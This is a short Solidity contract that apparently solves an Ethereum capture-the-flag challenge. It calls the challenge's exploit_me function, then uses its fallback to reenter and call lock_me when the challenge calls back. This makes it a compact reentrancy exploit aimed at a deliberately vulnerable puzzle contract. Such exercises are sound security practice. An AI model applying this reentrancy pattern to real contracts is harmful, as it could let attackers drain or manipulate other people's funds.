/**
 *Submitted for verification at Etherscan.io on 2022-10-27
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

contract Caller {

    address private _challenge;

    fallback() external {
        lockTrue();
    }

    function addMeToWin(address challenge, address account) public {
        _challenge = challenge;
        (bool success, ) = challenge.call(
            abi.encodeWithSignature("exploit_me(address)", account)
        );
        require(success, "Not success");
    }

    function lockTrue() public {
        // You can send ether and specify a custom gas amount
        (bool success, ) = _challenge.call(
            abi.encodeWithSignature("lock_me()")
        );
        require(success, "Not success");
    }
}